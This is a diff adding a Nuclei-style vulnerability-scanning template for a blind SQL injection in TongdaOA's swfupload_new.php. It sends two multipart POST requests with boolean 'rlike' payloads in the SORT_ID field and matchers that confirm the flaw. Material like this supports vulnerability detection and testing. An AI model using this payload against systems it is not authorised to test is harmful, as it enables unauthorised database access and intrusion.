@@ -1,0 +1,75 @@
+id: poc-tongda-swfupload-new-sqli
+info:
+  name: TongdaOA swfupload_new SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+http:
+  - raw:
+      - |
+        POST /general/file_folder/swfupload_new.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----------GFioQpMK0vv2
+
+        ------------GFioQpMK0vv2
+        Content-Disposition: form-data; name="ATTACHMENT_ID"
+        
+        1
+        ------------GFioQpMK0vv2
+        Content-Disposition: form-data; name="ATTACHMENT_NAME"
+        
+        1
+        ------------GFioQpMK0vv2
+        Content-Disposition: form-data; name="FILE_SORT"
+        
+        2
+        ------------GFioQpMK0vv2
+        Content-Disposition: form-data; name="SORT_ID"
+        
+        0 rlike (select (case when (1=0) then 1 else 0x28 end))
+        ------------GFioQpMK0vv2--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - contains(to_string(gbk_decode(body)), "错误，请联系管理员")
+      - type: dsl
+        dsl:
+          - not contains(body, "status")
+  - raw:
+      - |
+        POST /general/file_folder/swfupload_new.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----------GFioQpMK0vv2
+
+        ------------GFioQpMK0vv2
+        Content-Disposition: form-data; name="ATTACHMENT_ID"
+        
+        1
+        ------------GFioQpMK0vv2
+        Content-Disposition: form-data; name="ATTACHMENT_NAME"
+        
+        1
+        ------------GFioQpMK0vv2
+        Content-Disposition: form-data; name="FILE_SORT"
+        
+        2
+        ------------GFioQpMK0vv2
+        Content-Disposition: form-data; name="SORT_ID"
+        
+        0 rlike (select (case when (1=1) then 1 else 0x28 end))
+        ------------GFioQpMK0vv2--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - not contains(to_string(gbk_decode(body)), "错误，请联系管理员")
+      - type: dsl
+        dsl:
+          - contains(find_json(body, "status"), "1")
